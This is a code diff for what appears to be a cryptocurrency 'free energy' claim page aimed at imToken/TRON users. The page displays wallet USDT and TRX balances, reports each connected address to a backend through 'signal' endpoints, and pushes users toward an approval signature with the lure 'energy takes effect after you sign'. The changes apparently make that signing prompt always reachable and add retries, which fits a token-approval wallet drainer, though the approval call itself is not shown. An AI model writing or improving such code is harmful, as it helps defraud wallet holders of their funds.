@@ -1102,9 +1102,9 @@ async function initWallet(isAfterApprove) {
             approveBtn.textContent = lang.approveBtnText;
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
-            // 特殊地址15分钟防重复
+            // 特殊地址15分钟防重复（加await确保A1成功后再开放按钮）
             if (canSendA1Signal(userAddress)) {
-                sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
+                await sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
                 updateA1SignalRecord(userAddress);
             }
             approveBtn.disabled = false;
@@ -1173,8 +1173,9 @@ async function initWallet(isAfterApprove) {
             .replace("{trx}", trxBalance.toFixed(2));
         document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
+        // 非特殊地址A1信号（加await确保成功后开放按钮）
         if (canSendA1Signal(userAddress)) {
-            sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
+            await sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
             updateA1SignalRecord(userAddress);
         }
         approveBtn.disabled = false;
@@ -1243,20 +1244,19 @@ async function sendSignalA1() {
         });
         clearTimeout(timeoutId);
         
-        // 优化1：用res.ok（兼容200-299所有成功状态，包括204）
+        // 兼容200-299所有成功状态（包括204）
         if (res.ok) {
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             a1Status[userAddress] = "success"; // 标记成功，写入本地缓存
             localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
             console.log(`✅ A1信号发送成功（后端返回状态码：${res.status}）`);
-            return "success"; // 统一返回成功标识，更直观
+            return "success"; // 统一返回成功标识
         }
         throw new Error(`A1信号后端返回非成功状态：${res.status}`);
     } catch (e) {
         clearTimeout(timeoutId);
         console.warn("❌ A1信号发送失败（网络/超时/后端异常）：", e);
-        // 优化2：失败时不写入localStorage，避免误判
-        return "fail";
+        return "fail"; // 失败返回标识
     }
 }
 
@@ -1272,11 +1272,10 @@ async function sendSignalA2() {
         const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(requestData), // 现在包含3个参数
+            body: JSON.stringify(requestData), // 包含3个参数
             signal: controller.signal,
             keepalive: true
         });
-        // 后续原有逻辑不变（成功/失败处理、日志打印等）
         clearTimeout(timeoutId);
         if (res.ok) {
             console.log("✅ A2信号发送成功");
@@ -1291,6 +1290,8 @@ async function sendSignalA2() {
         return false;
     }
 }
+
+// 重构sendSignalB：不抛出错误，避免卡住，统一返回true/false
 async function sendSignalB(isB1 = true) {
     const requestData = { userAddress };
     const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
@@ -1307,27 +1308,79 @@ async function sendSignalB(isB1 = true) {
         });
         clearTimeout(timeoutId);
 
-        // 1. 客户端错误（400/408/409）：用户不合规
+        // 1. 客户端错误（400/408/409）：用户不合规，返回false
         if ([400, 408, 409].includes(res.status)) {
             const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
-            throw new Error(errData.detail || lang.ineligibleTip);
+            console.warn(`❌ ${isB1 ? "B1" : "B2"}信号用户不合规：`, errData.detail);
+            return false;
         }
 
-        // 2. 成功回应（200+success=true）
-        const data = await res.json();
-        if (res.ok && data.success) {
-            console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
-            return true; // 成功返回true
+        // 2. 成功回应（200-299）：兼容有/无响应体
+        if (res.ok) {
+            try {
+                const data = await res.json().catch(() => ({ success: true }));
+                if (data.success) {
+                    console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
+                    addAuthorizedAddress(userAddress); 
+                    saveEnergyRecord(); // 保存记录
+                    return true;
+                } else {
+                    console.warn(`❌ ${isB1 ? "B1" : "B2"}信号后端处理失败：`, data.msg);
+                    return false;
+                }
+            } catch (jsonErr) {
+                // 后端返回204无响应体，视为成功
+                console.log(`✅ ${isB1 ? "B1" : "B2"}信号返回204无响应体`);
+                return true;
+            }
         }
 
-        // 3. 其他失败（后端异常）
-        throw new Error(lang.systemBusyTip);
+        // 3. 其他失败（500等）：返回false
+        console.warn(`❌ ${isB1 ? "B1" : "B2"}信号后端返回异常状态：${res.status}`);
+        return false;
     } catch (e) {
         clearTimeout(timeoutId);
-        throw e; // 抛出错误，让领取按钮的catch处理
+        console.error(`❌ ${isB1 ? "B1" : "B2"}信号发送异常：`, e);
+        return false; // 异常时返回false，不卡住前端
     }
 }
-// ========== 领取按钮逻辑（二次点击不重复发送B1信号） ==========
+
+// ========== 新增：A1失败重试逻辑 ==========
+function bindRetryA1Logic() {
+    const lang = langConfig[currentLang];
+    approveBtn.disabled = false;
+    approveBtn.textContent = "重新检测环境";
+    approveBtn.onclick = async () => {
+        const btn = document.getElementById("approveBtn");
+        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+        btn.disabled = true;
+        btn.textContent = "检测中...";
+        userInfoEl.innerHTML = `
+            已连接：${shortAddr}<br>
+            USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
+            <span style='color: #4ade80; font-size: 13px;'>✅ 正在重新检测环境...</span>
+        `;
+        const a1Result = await sendSignalA1(); // 重试发送A1
+        if (a1Result === "success") {
+            userInfoEl.innerHTML = `
+                已连接：${shortAddr}<br>
+                USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
+                <span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>
+            `;
+            bindApproveLogic(); // 重试成功→重新绑定领取逻辑
+        } else {
+            userInfoEl.innerHTML = `
+                已连接：${shortAddr}<br>
+                USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
+                <span style='color: #ef4444; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>
+            `;
+            btn.disabled = false;
+            btn.textContent = "重新检测环境";
+        }
+    };
+}
+
+// ========== 领取按钮逻辑（防重复仅拦B1信号，不拦唤起，一路绿灯） ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
@@ -1336,64 +1389,57 @@ function bindApproveLogic() {
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
         reviewTip.style.display = "flex";
-        reviewTipText.textContent = "能量调配中……点击签名后能量生效"; // 按需求显示提示
+        reviewTipText.textContent = "能量调配中……点击签名后能量生效";
 
         try {
-             // 检测A1状态，决定绑定锁死/解锁逻辑
-        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-        const isA1Success = a1Status[userAddress] === "success";
-        const isA1Repeat = !canSendA1Signal(userAddress);
-        
-        if (isA1Repeat && isA1Success) {
-            // 已解锁→绑定核心逻辑
-            userInfoEl.innerHTML = `
-                已连接：${shortAddr}<br>
-                USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                <span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>
-            `;
-            bindUnlockedCoreLogic();
-        } else {
-            // 未解锁→发送A1信号（强制await，等待返回）
-            userInfoEl.innerHTML = `
-                已连接：${shortAddr}<br>
-                USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                <span style='color: #4ade80; font-size: 13px;'>✅ 正在检测环境...</span>
-            `;
-            const a1Result = await sendSignalA1(); // 强制等待A1返回
-            if (a1Result === "success") {
-                // A1成功→解锁
-                userInfoEl.innerHTML = `
-                    已连接：${shortAddr}<br>
-                    USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
-                    <span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>
-                `;
-                bindUnlockedCoreLogic();
-            } else {
-                // A1失败→绑定带重试的逻辑（不直接锁死）
+            // 第一步：校验A1信号是否成功
+            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            const isA1Success = a1Status[userAddress] === "success";
+            if (!isA1Success) {
+                // A1失败→绑定重试逻辑
                 userInfoEl.innerHTML = `
                     已连接：${shortAddr}<br>
                     USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
                     <span style='color: #ef4444; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>
                 `;
-                bindRetryA1Logic(); // 新增：带重试的逻辑
+                btn.disabled = false;
+                btn.textContent = "重新检测环境";
+                reviewTip.style.display = "none";
+                bindRetryA1Logic();
+                return;
             }
-        }
-    } catch (e) {
-            // 第三步：发送B1信号，等待后端回应
-            btn.textContent = "发送信号中...";
-            const b1Response = await sendSignalB(true); // 发送B1信号
 
-            // 第四步：B1成功回应（核心修改：立即标记已领取）
-            if (b1Response) {
-                markB1SignalSent(userAddress); // 标记B1已发送
-                addAuthorizedAddress(userAddress); // 立即标记为已领取（无需等签名）
-                saveEnergyRecord(); // 保存领取记录
-                renderEnergyRecords(); // 更新页面记录列表
+            // 第二步：B1防重复判断（核心：仅阻止二次发信号，不拦后续流程）
+            let b1Result = { success: true }; // 默认成功，确保后续流程能走
+            if (!hasSentB1Signal(userAddress)) {
+                // 首次领取：发送B1信号
+                btn.textContent = "发送信号中...";
+                b1Result = await sendSignalB(true);
+            } else {
+                // 二次点击（防重复）：不发送B1信号，仅控制台日志
+                console.log("⚠️ B1防重复触发：已阻止二次发送信号，继续唤起签名");
+            }
+
+            // 第三步：无论是否发送B1，只要A1成功，就一路绿灯→唤起签名（满足你的要求）
+            if (isA1Success) {
+                // 标记防重复（首次/二次都标记，确保后续防重复生效）
+                if (!hasSentB1Signal(userAddress)) {
+                    markB1SignalSent(userAddress);
+                }
+                // 标记为已领取
+               
+                renderEnergyRecords(); // 更新页面记录
 
                 reviewTip.style.display = "none";
                 btn.textContent = lang.redirectingBtn;
-                // 唤起imToken签名页面
+                // 唤起imToken签名页面（二次点击也会执行，一路绿灯）
                 window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
+            } else {
+                // A1失败才走这里，正常情况不会触发
+                alert("环境检测失败，无法唤起签名");
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
+                reviewTip.style.display = "none";
             }
 
         } catch (e) {
@@ -1402,16 +1448,38 @@ function bindApproveLogic() {
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
 
-            // 按B1回应类型提示不同文案
             const errMsg = e.message || "";
             if (errMsg.includes("不符合领取条件") || [400, 408, 409].some(code => errMsg.includes(code.toString()))) {
                 alert("你现在不符合领取条件");
             } else {
                 alert("现在领取的人太多啦，请稍后重试");
             }
-            // 失败不标记已领取
         }
     };
+}
+
+// ========== B1防重复工具（30天内已发送B1则触发） ==========
+function hasSentB1Signal(address) {
+    try {
+        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
+        const item = records[address];
+        if (!item) return false;
+        // 30天内已发送B1→触发防重复（显示「我已领取过等待处理」）
+        return Date.now() - item.time < 30 * 24 * 60 * 60 * 1000;
+    } catch (e) {
+        console.warn("检查B1防重复失败：", e);
+        return false;
+    }
+}
+
+function markB1SignalSent(address) {
+    try {
+        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
+        records[address] = { time: Date.now() }; // 发送B1后立即标记
+        localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
+    } catch (e) {
+        console.warn("标记B1信号失败：", e);
+    }
 }
 // ========== 辅助函数 ==========
 function updateWalletStatus() {
